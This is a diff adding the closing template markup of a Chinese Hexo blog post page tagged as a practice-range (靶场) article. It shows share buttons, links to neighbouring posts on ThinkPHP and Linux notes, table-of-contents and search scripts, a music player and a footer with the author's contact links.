+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                                    <span class="chip bg-color">靶场</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/11/06/Thinkphp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="thinkphp5.1框架学习笔记心得">
+                        
+                        <span class="card-title">thinkphp5.1框架学习笔记心得</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-06
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Atmujie
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%A1%86%E6%9E%B6/">
+                        <span class="chip bg-color">框架</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/11/06/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="linux学习笔记">
+                        
+                        <span class="card-title">linux学习笔记</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-06
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Atmujie
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%B3%BB%E7%BB%9F/">
+                        <span class="chip bg-color">系统</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">Atmujie</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/mujie00" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:2633298206@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2633298206" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2633298206" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
